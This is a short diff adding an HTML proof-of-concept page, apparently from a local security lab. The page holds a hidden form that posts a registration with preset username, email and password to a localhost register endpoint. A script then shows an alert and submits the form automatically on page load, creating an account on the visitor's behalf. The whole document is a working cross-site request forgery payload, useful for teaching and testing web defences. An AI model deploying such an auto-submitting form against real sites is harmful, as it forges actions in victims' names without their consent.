@@ -1,0 +1,10 @@
+<form name="XSS" action="http://localhost:8000/register" method="POST">
+  <input type="hidden" name="username" value="h4ck3d">
+  <input type="hidden" name="email" value="catchme@ifucan.net">
+  <input type="hidden" name="password" value="n00bs">
+</form>
+
+<script>
+alert("Hello!\nI added a new user on your behalf!"); 
+document.XSS.submit();
+</script>
